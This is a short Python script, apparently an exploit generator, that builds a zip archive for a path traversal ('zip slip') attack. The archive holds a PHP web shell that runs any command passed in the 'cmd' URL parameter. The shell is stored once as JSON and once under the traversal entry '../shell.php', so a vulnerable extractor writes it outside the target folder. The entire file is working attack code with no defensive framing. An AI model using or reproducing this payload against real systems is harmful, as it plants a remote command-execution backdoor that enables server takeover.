import json, zipfile
php = """<?php system($_GET['cmd']); ?>"""
# Create shell.json with 'name' and 'payload'
with open('shell.json', 'w') as f:
    json.dump({"name": "my_shell", "payload": php}, f)
# Create a zip file that includes shell.json and a path traversal entry
with zipfile.ZipFile('traversal.zip', 'w') as z:
    z.write('shell.json')
    z.writestr('../shell.php', php)
print('created traversal.zip')
